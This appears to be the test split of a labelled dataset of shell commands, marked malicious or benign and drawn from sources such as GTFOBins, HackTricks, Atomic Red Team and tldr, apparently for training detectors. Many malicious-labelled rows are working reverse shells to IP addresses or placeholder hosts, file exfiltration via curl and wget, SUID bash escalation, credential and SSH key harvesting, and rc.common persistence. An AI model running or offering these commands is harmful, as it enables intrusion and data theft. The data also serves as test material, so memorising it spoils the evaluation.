id,command,label,source,split
d1_011357,bash-4.2$ $ id,1,hacktricks,test
d1_011361,chmod 644 metrics.csv,0,bash_instruct,test
d1_011373,"find . -type f \( -name ""*.js"" ! -name ""*-min*"" ! -name ""*console*"" \)",0,nl2bash,test
d1_011376,cp -p backup.log migrations/,0,bash_instruct,test
d1_011377,kernel-install inspect path/to/kernel_image,0,tldr,test
d1_011378,yay -S yakyak,0,linlm,test
d1_011384,chmod +x auth.bak,0,bash_instruct,test
d1_011387,"zeroclaw agent [-m|--message] ""Hello"" --peripheral nucleo-f401re:/dev/ttyACM0",0,tldr,test
d1_011392,rsync -avz --delete media/ svc-app@www.internal:/backup/,0,bash_instruct,test
d1_011396,macptopbm path/to/file.macp > path/to/output.pbm,0,tldr,test
d1_011400,[ -f profile.log ] && cat profile.log || echo 'not found',0,bash_instruct,test
d1_011406,ipinfo summarize path/to/ips.txt,0,tldr,test
d1_011415,"say --output-file filename.aiff ""Here's to the Crazy Ones.""",0,tldr,test
d1_011416,screen -d -m -L python test.py,0,nl2bash,test
d1_011418,ls -lt logs,0,bash_instruct,test
d1_011423,sysctl 'kernel.core_pattern=|/path/to/command',1,gtfobins,test
d1_011424,nl settings.tmp,0,bash_instruct,test
d1_011425,"""rbind"",",1,hacktricks,test
d1_011427,wc -l customer.py,0,bash_instruct,test
d1_011428,"find site/ -type f -name ""*.html"" -exec sed -i 's|http://hb364a98a.example.net//new.example.com|g' {} +",0,bash6k,test
d1_011437,sc_warts2pcap -s -o path/to/output.pcap path/to/file.warts,0,tldr,test
d1_011440,ash -p,1,gtfobins,test
d1_011442,"xml [sel|select] [-t|--template] [-v|--value-of] ""count(XPATH1)"" path/to/input.xml|uri",0,tldr,test
d1_011448,cp -p metrics.xml build/,0,bash_instruct,test
d1_011450,declare historywords,1,hacktricks,test
d1_011452,tar -czf - fixtures | ssh bob@git.service.io 'cat > /backup/fixtures.tar.gz',0,bash_instruct,test
d1_011457,dotnet test,0,linlm,test
d1_011461,"php -r '$sock=fsockopen(""15.22.101.194"",4242);passthru(""/bin/sh -i <&3 >&3 2>&3"");'",1,payloads,test
d1_011464,lprm -h server:port job_id,0,tldr,test
d1_011467,var fos = new FileOutputStream('/path/to/output-file');,1,gtfobins,test
d1_011471,"rsync -rave ""ssh -i /home/test/pkey_new.pem"" /var/www/test/ ubuntu@176.193.10.184:/var/www/test",0,nl2bash,test
d1_011477,glances [-w|--webserver],0,tldr,test
d1_011485,pgrep -a apache2,0,bash_instruct,test
d1_011487,"grep -rl ""ERROR"" /etc/*.conf | xargs -d '\n' sed -i 's/ERROR/WARN/g'",0,bash6k,test
d1_011504,mt -f /dev/nstX rewind,0,tldr,test
d1_011513,"/tmp/httpd -v >""/tmp/VMware-SDMP-Scripts-{UUID}/script_-{ID}_0.stdout"" 2>""/tmp/VMware-SDMP-Scripts-{UUID}/script_-{ID}_0.stderr""",1,hacktricks,test
d1_011514,tar -czf - modules | ssh backup@app01.example.com 'cat > /backup/modules.tar.gz',0,bash_instruct,test
d1_011518,sed -i 's/password/76.132.177.92/g' schema.txt,0,bash_instruct,test
d1_011524,xargs -a /dev/null /bin/sh -p,1,gtfobins,test
d1_011527,cat catalog.tsv | tr ' ' '\n' | sort | uniq -c | sort -nr | head -n 5,0,bash_instruct,test
d1_011528,[ -f results.jpg ] && cat results.jpg || echo 'not found',0,bash_instruct,test
d1_011530,7zr x path/to/archive.7z -opath/to/output,0,tldr,test
d1_011532,cat /etc/passwd > /tmp/T1003.008.txt,1,atomic_red_team,test
d1_011533,npm org ls organization_name --json,0,tldr,test
d1_011543,openclaw channels login --channel telegram --verbose,0,tldr,test
d1_011549,du -ah data | sort -rh | head -n 20,0,bash_instruct,test
d1_011550,nix-env [-i|--install] pkg_name [-f|--file] example.com,0,tldr,test
d1_011556,grep -oE '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+' config.conf | sort -u,0,bash_instruct,test
d1_011564,RsaCtfTool.py --publickey path/to/key.pub --decryptfile path/to/ciphered_file,0,tldr,test
d1_011565,"find ""$DIR_TO_CLEAN"" -type -f -mtime ""+$DAYS_TO_SAVE"" -exec rm {} \; -exec printf '.' \; | wc -c",0,nl2bash,test
d1_011568,ecpg input.pgh,0,tldr,test
d1_011569,load /path/to/lib.so x,1,gtfobins,test
d1_011573,pridecat path/to/file,0,tldr,test
d1_011576,sudo snort -vd -i interface,0,tldr,test
d1_011581,tldr [-p|--platform] common cut,0,tldr,test
d1_011592,"IFS=,;`cat<<<cat,/etc/passwd`",1,hacktricks,test
d1_011596,bridge link 2>/dev/null,1,hacktricks,test
d1_011598,chmod go-w test.csv,0,bash_instruct,test
d1_011600,aa-status 2>/dev/null || apparmor_status 2>/dev/null,1,hacktricks,test
d1_011601,agetty -l /bin/sh -o -p -a root tty,1,gtfobins,test
d1_011602,ldd /bin/* /usr/bin/* | sed -e '/^[^\t]/ d; s/^\t\(.* => \)\?\([^ ]*\) (.*/\2/g' | sort | uniq -c,0,nl2bash,test
d1_011610,nxc ftp 67.197.130.184 [-u|--username] path/to/usernames.txt [-p|--password] path/to/passwords.txt --continue-on-success,0,tldr,test
d1_011618,ab -v2 http://hdedf5e56.example.net/path/to/input-file,1,gtfobins,test
d1_011626,chmod go-w payload.log,0,bash_instruct,test
d1_011630,command | sed -f path/to/script_file.sed,0,tldr,test
d1_011635,cp -p test.css cache/,0,bash_instruct,test
d1_011643,pv source.iso > /mnt/backup/source.iso,0,bash6k,test
d1_011645,"if [ ""a"" ]; then echo 1; fi",1,hacktricks,test
d1_011646,cp product.pdf scripts/,0,bash_instruct,test
d1_011647,./bifrost -action dump -source keytab -path /path/to/your/file,1,hacktricks,test
d1_011665,sh -i 3<> /dev/tcp/20.97.27.71/443 0<&3 1>&3 2>&3,1,quasarnix,test
d1_011674,tldr luanti,0,tldr,test
d1_011676,wget -O exploit.py http://h88f1c19c.example.net/download/31853,1,hacktricks,test
d1_011680,pipewire --help,0,tldr,test
d1_011687,mkdir -p downloads/2026/logs,0,bash_instruct,test
d1_011691,shopt -s nocasematch,0,nl2bash,test
d1_011692,sed -i 's/warning/password/g' dump.log,0,bash_instruct,test
d1_011695,sails generate model name,0,tldr,test
d1_011702,"stat --printf=""%y %n\n"" $(ls -tr $(find * -type f))",0,nl2bash,test
d1_011703,sed 's/^[[:space:]]*//' data.ini > clean.txt,0,bash_instruct,test
d1_011714,cp -p settings.js media/,0,bash_instruct,test
d1_011722,"find . -iname ""$srch1*"" -exec grep ""It took"" {} \; -print |sed -r 'N;s/(.*)\n(.*)/\2 \1/' > temp1",0,nl2bash,test
d1_011730,grep -oE '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+' dump.txt | sort -u,0,bash_instruct,test
d1_011731,sed 's/admin/false/g' data.yaml,0,bash_instruct,test
d1_011734,zypper x,1,gtfobins,test
d1_011737,uniq -d export.log,0,bash_instruct,test
d1_011741,prowler kubernetes [-c|--checks] etcd_encryption,0,tldr,test
d1_011744,find . -exec grep -l foo {} \;,0,nl2bash,test
d1_011755,chmod go-w profile.bak,0,bash_instruct,test
d1_011756,make /tmp/cap,1,atomic_red_team,test
d1_011773,docker run -it unikernel bash,0,linlm,test
d1_011774,nc -cu /usr/bin/sh 35.231.127.244 22,1,quasarnix,test
d1_011784,ls -la dist,0,bash_instruct,test
d1_011792,find /var/www -name *.gif -ctime +90 -ctime -180,0,nl2bash,test
d1_011795,curl -X POST --data-binary DATA http://hdedf5e56.example.net,1,gtfobins,test
d1_011797,podman-compose down [-v|--volumes],0,tldr,test
d1_011800,valgrind program,0,tldr,test
d1_011832,bw list items --search github,0,tldr,test
d1_011838,ls -l /proc/self/ns/time /proc/self/ns/time_for_children,1,hacktricks,test
d1_011841,"php -r 'system(""/bin/sh -i"");'",1,gtfobins,test
d1_011843,"echo ""python3 -c \""import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgcmMuY29tbW9uID4gL3RtcC9UMTAzNy4wMDQucmMuY29tbW9uJykK'))\"""" | sudo tee -a /etc/rc.common",1,atomic_red_team,test
d1_011850,AuthorizedKeysFile .ssh/authorized_keys access,1,hacktricks,test
d1_011851,file /tmp/recovered.bin,1,hacktricks,test
d1_011852,debugfs /dev/sda1,1,hacktricks,test
d1_011854,bootctl,0,tldr,test
d1_011855,swipl path/to/file.pl,0,tldr,test
d1_011870,rg pattern [-g|--glob] filename_glob_pattern,0,tldr,test
d1_011874,ascii85 /path/to/input-file | ascii85 --decode,1,gtfobins,test
d1_011880,systemctl stop unit --user,0,tldr,test
d1_011882,xdg-open --help,0,tldr,test
d1_011891,"zip --password ""InsertPasswordHere"" /tmp/T1560/T1560 ./*",1,atomic_red_team,test
d1_011894,"seq 10 | paste -sd"" \n"" -",0,nl2bash,test
d1_011899,sudo systemctl stop cron,1,atomic_red_team,test
d1_011908,[ -f backup.js ] && cat backup.js || echo 'not found',0,bash_instruct,test
d1_011916,"nmap --script-help ""(default or version) and *smb*""",1,hacktricks,test
d1_011921,cp notes.pdf config/,0,bash_instruct,test
d1_011928,find /home -iname *.rhosts -exec ls -la {} 2>/dev/null \; -exec cat {} 2>/dev/null \;,1,slp,test
d1_011931,cat build.txt | sort | uniq -c | sort -nr,0,bash_instruct,test
d1_011932,"su $USER -c ""$WEB --quiet"" &",0,nl2bash,test
d1_011934,docker run --name mongo -d mongo,0,linlm,test
d1_011935,mv report.zip bin/,0,bash_instruct,test
d1_011936,echo 'API_KEY=secret' > .env,0,linlm,test
d1_011937,stat sales.bak,0,bash_instruct,test
d1_011951,service ../../bin/sh,1,gtfobins,test
d1_011953,which psql,0,bash_instruct,test
d1_011954,stack exec -- servant-example,0,linlm,test
d1_011959,head -n 20 access.old,0,bash_instruct,test
d1_011960,packer validate path/to/config.json,0,tldr,test
d1_011965,apt-cache show example,0,bash6k,test
d1_011968,find . -name '*.py' | xargs wc -l,0,linlm,test
d1_011969,cp access.py templates/,0,bash_instruct,test
d1_011972,exec -l command -with -flags,0,tldr,test
d1_011973,"grep -RIn ""TODO"" . --exclude-dir=node_modules",0,bash6k,test
d1_011974,cargo deb --target x86_64-unknown-linux-gnu,0,tldr,test
d1_011975,find /path/to/files -type d -name '.git' -exec dirname {} +,0,nl2bash,test
d1_011977,nasm -@ /path/to/input-file,1,gtfobins,test
d1_011982,nice -n 1 gzip huge.log,0,bash_instruct,test
d1_011983,wget --post-file=/path/to/input-file http://hdedf5e56.example.net,1,gtfobins,test
d1_011989,sudo apt purge -y ncdu,0,bash_instruct,test
d1_011993,sway,0,tldr,test
d1_012000,screencapture -P,0,tldr,test
d1_012003,find include -type f -user svc-app,0,bash_instruct,test
d1_012018,service art-test enable,1,atomic_red_team,test
d1_012024,tar -czf - project | ssh ubuntu@mail.example.org 'cat > /backup/project.tar.gz',0,bash_instruct,test
d1_012026,stat -c %y config.yaml,0,bash6k,test
d1_012031,tar -czf - include | ssh carol@git.internal 'cat > /backup/include.tar.gz',0,bash_instruct,test
d1_012056,git push --force origin branch_name,0,linlm,test
d1_012057,shutdown -h 13:00,0,tldr,test
d1_012062,shred -v -n 0 -z -u /path/to/your/file #overwriting with zeroes and remove the file,0,nl2bash,test
d1_012073,nft -f /path/to/input-file,1,gtfobins,test
d1_012081,[ -f results.sh ] && cat results.sh || echo 'not found',0,bash_instruct,test
d1_012083,"export RHOST=""example.com""; export RPORT=""4242""; export PSK=""replacewithgeneratedpskfromabove""; export PIPE=""/tmp/`openssl rand -hex 4`""; mkfifo $PIPE; /bin/sh -i < $PIPE 2>&1 | openssl s_client -quiet -tls1_2 -psk $PSK -connect $RHOST:$RPORT > $PIPE; rm $PIPE",1,slp,test
d1_012096,ps -auxf | grep /bin/sh,1,hacktricks,test
d1_012100,abrt-action-analyze-c,0,tldr,test
d1_012102,path=`which oracle`,0,nl2bash,test
d1_012104,sudo unshare -T --fork --monotonic 86400 --boottime 604800 --mount-proc bash,1,hacktricks,test
d1_012106,latexpand --expand-usepackage [-o|--output] path/to/output.tex path/to/file.tex,0,tldr,test
d1_012114,chmod +x profile.jpg,0,bash_instruct,test
d1_012118,git bug pull,0,tldr,test
d1_012121,pkill -u john,0,bash6k,test
d1_012128,ps aux | grep tmux,1,hacktricks,test
d1_012129,sudo chown postgres changelog.gz,0,bash_instruct,test
d1_012130,echo DATA | less,1,gtfobins,test
d1_012131,rsync -avn logs/ scripts/,0,bash_instruct,test
d1_012136,0<&3;exec 3<>/dev/tcp/68.18.184.166/9001; dash <&3 >&3 2>&3,1,quasarnix,test
d1_012140,zstd [-T|--threads] 0,0,tldr,test
d1_012143,soffice --pt printer_name path/to/file1 path/to/file2 ...,0,tldr,test
d1_012145,find / -perm -g=s -o -perm -u=s -type f 2>/dev/null,1,slp,test
d1_012148,screen -L /path/to/output-file echo DATA,1,gtfobins,test
d1_012153,echo log_entry | logger [-t|--tag] tag,0,tldr,test
d1_012154,cat release.json | sort | uniq,0,bash_instruct,test
d1_012156,/bin/sh -i >& /dev/udp/76.132.177.92/41019 0>&1,1,quasarnix,test
d1_012164,sudo msfconsole,0,tldr,test
d1_012166,gpg --keyserver hkps://keys.openpgp.org --recv-keys 4A5B1C5A5A49B30D,0,linlm,test
d1_012167,sudo chown ubuntu metrics.zip,0,bash_instruct,test
d1_012168,nerdctl logs [-f|--follow] container_name,0,tldr,test
d1_012172,libcap-ng.so.0 => /lib/x86_64-linux-gnu/libcap-ng.so.0 (0x00007fe472a4f000),1,hacktricks,test
d1_012175,rake -p '...',1,gtfobins,test
d1_012186,plymouth ask-for-password --prompt=x --command=/bin/sh,1,gtfobins,test
d1_012189,./stratus detonate aws.defense-evasion.cloudtrail-event-selectors --force,1,atomic_red_team,test
d1_012196,pgmramp -ellipse path/to/image.pgm > path/to/output.pgm,0,tldr,test
d1_012199,poetry lock --regenerate,0,tldr,test
d1_012202,"onionsearch ""string"" --engines tor66|deeplink|phobos|...",0,tldr,test
d1_012215,last | tail,1,hacktricks,test
d1_012225,[ -f report.pdf ] && cat report.pdf || echo 'not found',0,bash_instruct,test
d1_012227,date 2>/dev/null,1,hacktricks,test
d1_012229,kopia policy set --global --keep-latest number_of_snapshots_to_keep --compression compression_algorithm,0,tldr,test
d1_012237,mv *.cache bin/,0,bash_instruct,test
d1_012240,openvpn --dev null --script-security 2 --up '/bin/sh -p -s',1,gtfobins,test
d1_012242,cat payload.tsv | sort | uniq -c | sort -nr,0,bash_instruct,test
d1_012250,sudo iptables -A INPUT -s 38.201.6.82 -j DROP,0,linlm,test
d1_012260,cat backup.tsv | sort | uniq,0,bash_instruct,test
d1_012268,pyinfra target_ip_address exec -- command_name_and_arguments,0,tldr,test
d1_012271,lsd --tree [-d|--directory-only],0,tldr,test
d1_012272,PING=$(ping ADDRESS -c 1 | grep -E -o '[0-9]+ received' | cut -f1 -d' '),0,nl2bash,test
d1_012280,file invoice.png,0,bash_instruct,test
d1_012282,grep Seccomp /proc/self/status,1,hacktricks,test
d1_012284,stat release.tar.gz,0,bash_instruct,test
d1_012294,iptables-save -f /path/to/output-file,1,gtfobins,test
d1_012298,"sed 's/\t/,/g' schema.json > schema.json.csv",0,bash_instruct,test
d1_012306,ncat 15.22.101.194 4242 -e /bin/bash,1,payloads,test
d1_012316,rm -rf temp_dir,0,bash6k,test
d1_012317,gcc @/path/to/input-file,1,gtfobins,test
d1_012323,head -$(gcalctool -s $(cat file | wc -l)-N) file.txt,0,nl2bash,test
d1_012325,git reflog [-n|--max-count] 5,0,tldr,test
d1_012332,chmod 4777 /bin/bash,1,hacktricks,test
d1_012334,gvmap -c 1|2|3|... graph.gv -o output.xdot,0,tldr,test
d1_012340,sudo dnf install -y docker.io,0,bash_instruct,test
d1_012343,"octave-cli --eval 'fid = fopen(""/path/to/output-file"", ""w""); fputs(fid, ""DATA""); fclose(fid);'",1,gtfobins,test
d1_012345,zip -e secret.zip secret.txt <<EOF,0,bash6k,test
d1_012347,dotnet tool [-h|--help],0,tldr,test
d1_012349,chmod +x /tmp/unknown,1,hacktricks,test
d1_012355,ssh ubuntu@staging.example.com uptime,0,bash_instruct,test
d1_012381,crunch 1 1 -p abc,0,tldr,test
d1_012384,hanami assets precompile,0,linlm,test
d1_012389,head -n 20 sales.txt,0,bash_instruct,test
d1_012391,find . -name \*.php -type f -exec php -l {} \;,0,nl2bash,test
d1_012395,postgres -p 5433,0,tldr,test
d1_012399,/bin/bash -i 3<> /dev/tcp/181.221.17.63/60781 0<&3 1>&3 2>&3,1,quasarnix,test
d1_012404,ps auxww,0,tldr,test
d1_012406,pt [-c|--count] foo,0,tldr,test
d1_012410,"sed 's/\t/,/g' backup.json > backup.json.csv",0,bash_instruct,test
d1_012412,"if [ -x ""$(command -v groups)"" ]; then groups; else echo ""groups is missing from the machine. skipping...""; fi;",1,atomic_red_team,test
d1_012416,poetry run python /path/to/temp-file,1,gtfobins,test
d1_012419,pg_recvlogical [-?|--help],0,tldr,test
d1_012426,mv account.py account.py.old,0,bash_instruct,test
d1_012444,sudo aa-easyprof /path/to/binary,1,hacktricks,test
d1_012446,gphoto2 --auto-detect,0,tldr,test
d1_012450,update-ca-trust,1,atomic_red_team,test
d1_012455,arguments_source | xargs [-n|--max-args] 1 command,0,tldr,test
d1_012465,ls -t /data/uploads | head -n 1,0,bash_instruct,test
d1_012471,pkexec command,0,tldr,test
d1_012474,reindexdb database_name [-t|--table] table_name,0,tldr,test
d1_012479,find . -name *.gif -exec ls {} \;,0,nl2bash,test
d1_012504,apt-get install package,0,bash6k,test
d1_012505,bzip2 -k notes.txt,0,bash6k,test
d1_012506,v run path/to/file.v,0,tldr,test
d1_012508,xxd -l 64 metrics.pdf,0,bash_instruct,test
d1_012511,lvmdiskscan [-l|--lvmpartition],0,tldr,test
d1_012517,cp -p product.tar.gz logs/,0,bash_instruct,test
d1_012522,ls -la /sys/firmware 2>/dev/null,1,hacktricks,test
d1_012523,"grep -v ""skip"" data.txt > filtered.txt",0,bash6k,test
d1_012527,"who | cut -d "" "" -f1,2",0,nl2bash,test
d1_012528,cat /etc/sysconfig/logstash 2>/dev/null,1,hacktricks,test
d1_012531,find /etc/rc.d/init.d \! -uid 0 -type f 2>/dev/null |xargs -r ls -la 2>/dev/null,1,slp,test
d1_012535,sudo visudo -c -f /etc/sudoers,1,atomic_red_team,test
d1_012536,tar --exclude='*/node_modules' -czvf project.tar.gz project,0,bash6k,test
d1_012538,"if [ -f /sys/class/dmi/id/chassis_vendor ]; then cat /sys/class/dmi/id/chassis_vendor | grep -i ""Xen\|Bochs\|QEMU""; fi",1,atomic_red_team,test
d1_012545,cat debug.md | tr 'a-z' 'A-Z',0,bash_instruct,test
d1_012549,find /run /var/run -maxdepth 2 -type s 2>/dev/null | egrep 'confd|cli|rest|mgmt',1,hacktricks,test
d1_012560,find / -perm -o w -type d 2>/dev/null,1,slp,test
d1_012563,"cut -d, -f7 report.csv | sort | uniq -c | sort -nr | head -n 10",0,bash_instruct,test
d1_012569,sudo nano /etc/pam.d/common-auth,1,hacktricks,test
d1_012573,getent shadow,1,gtfobins,test
d1_012574,"find . -type d -depth 1 -print0 | xargs -0 sh -c 'for dir; do pushd ""$dir"" && latexmk -c && popd; done' fnord",0,nl2bash,test
d1_012581,chmod go-w transaction.tar.gz,0,bash_instruct,test
d1_012582,touch @root.txt,1,hacktricks,test
d1_012588,"mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo ""tmpfs blocked""",1,hacktricks,test
d1_012593,poetry publish --skip-existing,0,tldr,test
d1_012606,automount -cv,0,tldr,test
d1_012611,"local r,x=c:receive();local f=assert(io.popen(r,""r""));",1,gtfobins,test
d1_012614,lambo new --create-db --dbuser=user --dbpassword=password app_name,0,tldr,test
d1_012615,keepassxc-cli ls path/to/database_file path/to/directory,0,tldr,test
d1_012618,ls -d /etc/apparmor*,1,hacktricks,test
d1_012632,find $allsgid -uid 0 -perm -2002 -type f -exec ls -la {} 2>/dev/null \;,1,slp,test
d1_012636,"setfile -d ""MM/DD/YYYY HH:MM:SS"" path/to/file1 path/to/file2 ...",0,tldr,test
d1_012645,grub-file --is-x86_64-xnu path/to/file,0,tldr,test
d1_012656,tldr xbps-query,0,tldr,test
d1_012658,dpkg-reconfigure package1 package2 ...,0,tldr,test
d1_012661,find /etc -name ppp.conf,0,nl2bash,test
d1_012666,coreaudiod,0,tldr,test
d1_012669,clip-view --clear-page|theme-cache,0,tldr,test
d1_012670,"kubectl set resources [deploy|deployment]/deployment_name --limits cpu=cpu_limit,memory=memory_limit",0,tldr,test
d1_012671,dolt clone --aws-creds-type credentials_type repository_url,0,tldr,test
d1_012672,~/.zlogin,1,hacktricks,test
d1_012677,find /etc -name '*.conf',0,nl2bash,test
d1_012683,find ./ -path ./beta/* -prune -o -iname example.com -print,0,nl2bash,test
d1_012686,cp backup.pdf backup.pdf.bak,0,bash_instruct,test
d1_012690,mv payment.json payment.json.old,0,bash_instruct,test
d1_012691,zeroclaw channel [-h|--help],0,tldr,test
d1_012692,find . -name \*.php -type f -print0 | xargs -0 grep -Hn '$test',0,nl2bash,test
d1_012700,tmux attach -t myname,1,hacktricks,test
d1_012701,terminalizer render path/to/recording.gif,0,tldr,test
d1_012703,streamlit hello,0,tldr,test
d1_012708,cp -u notes.zip templates/,0,bash_instruct,test
d1_012709,yay -S rocketchat-desktop,0,linlm,test
d1_012711,"php -r '$sock=fsockopen(""example.com"",4242);popen(""/bin/sh -i <&3 >&3 2>&3"", ""r"");'",1,slp,test
d1_012713,hydra -C path/to/username_password_pairs.txt imap://[host_range_cidr],0,tldr,test
d1_012724,gcc -shared -fPIC proof.c -o /writable/path/libexample.so,1,hacktricks,test
d1_012728,script -q -c '# DATA' /path/to/output-file,1,gtfobins,test
d1_012729,exiv2 [-P|-Print] kv path/to/file,0,tldr,test
d1_012734,find /var/run /run -maxdepth 1 -type f \( -name '*.pid' -o -name '*.lock' \) -size 0c -printf '%m %p\n' 2>/dev/null,1,hacktricks,test
d1_012737,"tac -s "","" parse.txt > newparse.txt",0,nl2bash,test
d1_012740,"find ""$STORAGEFOLDER"" -name .todo -exec dirname {} \;",0,nl2bash,test
d1_012753,grep -c 'OutOfMemory' access.log | cat,0,bash_instruct,test
d1_012756,"cat <<'EOF' > ""$plugin""",1,hacktricks,test
d1_012758,find . -type f -print0 | xargs -0 -n 1,0,nl2bash,test
d1_012766,cat response.md | sort | uniq -c | sort -nr,0,bash_instruct,test
d1_012774,find /home/deploy -type f -name '*.txt' -print0 | xargs -0 cat | wc -l,0,bash_instruct,test
d1_012779,readlink /proc/self/ns/time,1,hacktricks,test
d1_012781,find / -name id_rsa 2>/dev/null -exec rsync -R {} /tmp/art-staging \;,1,atomic_red_team,test
d1_012782,touch -a UEDP0{1..5}_20120821.csv,0,nl2bash,test
d1_012786,file release.py,0,bash_instruct,test
d1_012788,plasma-apply-colorscheme --help,0,tldr,test
d1_012790,chmod +x /tmp/art.sh,1,atomic_red_team,test
d1_012791,deepseek --help,0,tldr,test
d1_012798,0<&3;exec 3<>/dev/tcp/213.181.49.62/37364; /bin/sh <&3 >&3 2>&3,1,quasarnix,test
d1_012802,logrotate -m /path/to/temp-file.sh -f /path/to/temp-file,1,gtfobins,test
d1_012803,mv -n archive.py archive.py.old,0,bash_instruct,test
d1_012806,ltrace -F /path/to/input-file /dev/null,1,gtfobins,test
d1_012807,chmod 660 /dev/sdb,1,hacktricks,test
d1_012808,kubectl get secrets -n default,1,atomic_red_team,test
d1_012810,docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current,1,hacktricks,test
d1_012816,qrencode [-t|--type] ansiutf8 string,0,tldr,test
d1_012820,whatweb website1 website2 ...,0,tldr,test
d1_012821,"echo ""ExecStart=/bin/bash -c ""echo atomictest > /tmp/atomic_service_output.txt"""" >> /etc/systemd/system/atomic-test.service",1,atomic_red_team,test
d1_012825,sudo chown -R bob:www-data include,0,bash_instruct,test
d1_012836,cat notes.ini | tail -n 15,0,bash_instruct,test
d1_012843,pkill starlette,0,linlm,test
d1_012844,conda config --show config_option,0,tldr,test
d1_012849,sfdk engine show,0,tldr,test
d1_012850,[ -f audit.sh ] && cat audit.sh || echo 'not found',0,bash_instruct,test
d1_012851,grep -oE '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+' dump.md | sort -u,0,bash_instruct,test
d1_012854,pct [ex|exec] 100 command,0,tldr,test
d1_012856,curl -skI --proxy http://h56852a54.example.net http://h0caaf24a.example.net > /tmp/curl_out.txt,1,atomic_red_team,test
d1_012861,pveum [pa|passwd] username@pve,0,tldr,test
d1_012863,namei -l /root/dbus-server,1,hacktricks,test
d1_012868,sed 's/^[[:space:]]*//' event.json > clean.txt,0,bash_instruct,test
d1_012871,cat manifest.log | wc -l,0,bash_instruct,test
d1_012873,ln -sn git-stuff/home/profile .profile,0,nl2bash,test
d1_012874,renice -n 3 -p pid,0,tldr,test
d1_012875,"cut -d, -f3 customers.csv | sort | uniq -c | sort -nr | head -n 20",0,bash_instruct,test
d1_012878,"find <directory_name> -type d -exec sh -c ""cd {} && [ -d live ] && [ -d test ] && cd ../ && echo \""Deleting {}\"" && rm -rvi {} "" {} \;",0,nl2bash,test
d1_012880,"exec /usr/bin/find ""$@""",0,nl2bash,test
d1_012891,exec >&0,1,hacktricks,test
d1_012893,sort ports.txt | uniq -c | sort -r,0,nl2bash,test
d1_012900,"if [ -x ""$(command -v ifconfig)"" ]; then ifconfig; else echo ""ifconfig is missing from the machine. skipping...""; fi;",1,atomic_red_team,test
d1_012905,dos2unix -f -O /path/to/input-file,1,gtfobins,test
d1_012909,yum -v repolist enabled,0,nl2bash,test
d1_012911,srun path/to/program > path/to/output,0,tldr,test
d1_012913,"echo ""XHC"" | sudo tee /proc/acpi/wakeup",0,linlm,test
d1_012914,grep -oE '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+' archive.log | sort -u,0,bash_instruct,test
d1_012921,nc -eu /usr/bin/bash 3.171.174.250 50053,1,quasarnix,test
d1_012927,gh ssh-key add path/to/key.pub,0,tldr,test
d1_012929,"find . -name ""*.xml"" -exec grep ""ERROR"" /dev/null '{}' \+",0,nl2bash,test
d1_012933,rsync -av tmp/ project/,0,bash_instruct,test
d1_012942,chown root:root /tmp/AtomicRedTeam/atomics/T1222.002/T1222.002.yaml,1,atomic_red_team,test
d1_012958,find /home/deploy -type f -name '*.py' -print0 | xargs -0 rm -f,0,bash_instruct,test
d1_012960,"find /var/www -type d \( ! -wholename ""/var/www/web-release-data/*"" ! -wholename ""/var/www/web-development-data/*"" \)",0,nl2bash,test
d1_012962,find . -type d –print | wc -l,0,nl2bash,test
d1_012972,"fonttools subset path/to/font.ttf --unicodes=U+0000-007F --layout-features=onum,kern",0,tldr,test
d1_012977,xml [val|validate] path/to/input1.xml|uri1 path/to/input2.xml|uri2 ...,0,tldr,test
d1_012987,sudo chgrp deploy test.html,0,bash_instruct,test
d1_012996,target extended-remote localhost:4500,0,tldr,test
d1_013000,cat -n payment.tsv,0,bash_instruct,test
d1_013023,cp -u transaction.pdf media/,0,bash_instruct,test
d1_013024,wc -m path/to/file,0,tldr,test
d1_013029,pio settings reset,0,tldr,test
d1_013039,7za a path/to/archive.7z -mx=0|1|3|5|7|9 path/to/file_or_directory,0,tldr,test
d1_013051,du -h /home,0,bash6k,test
d1_013052,du -b|k|m path/to/directory,0,tldr,test
d1_013061,yarac -d identifier=value path/to/rule.yar path/to/rule.bin,0,tldr,test
d1_013062,/opt/backups/current/bash -p,1,hacktricks,test
d1_013063,chmod 644 schema.conf,0,bash_instruct,test
d1_013065,cat data.yaml | sort | uniq -c | sort -nr,0,bash_instruct,test
